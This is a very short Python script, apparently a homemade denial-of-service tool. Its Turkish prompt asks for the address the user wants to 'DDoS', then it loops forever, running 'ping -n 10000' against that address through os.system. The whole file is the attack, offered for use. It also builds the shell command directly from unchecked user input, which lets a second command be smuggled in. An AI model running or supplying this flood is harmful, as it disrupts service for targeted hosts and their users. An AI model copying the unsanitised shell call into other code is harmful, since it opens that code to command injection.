import os 

adress = input(("Ddos atmak istediğiniz adresi girin?\n"))
while True:
    os.system("ping -n 10000   %s" % adress)
